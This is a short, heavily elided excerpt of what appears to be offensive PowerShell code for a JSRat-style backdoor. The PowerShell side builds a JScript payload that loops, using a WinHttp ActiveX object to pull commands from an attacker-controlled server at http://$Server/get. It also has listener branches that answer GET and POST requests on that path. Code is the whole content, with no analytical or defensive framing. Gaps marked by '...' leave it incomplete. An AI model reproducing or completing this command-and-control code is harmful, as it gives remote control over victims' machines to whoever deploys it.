...
while ($true) 
{
        ...
        $message = '
			while(true)
			{
				h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                        	...
                        	try
                        	{
					h.Open("GET","http://'+$Server+'/get",false);
					h.Send();
					c = h.ResponseText;
	...
	if ($request.Url -match '/get$' -and ($request.HttpMethod -eq "POST") ) 
	{ 
    	...
    	if ($request.Url -match '/get$' -and ($request.HttpMethod -eq "GET")) 
    	{  
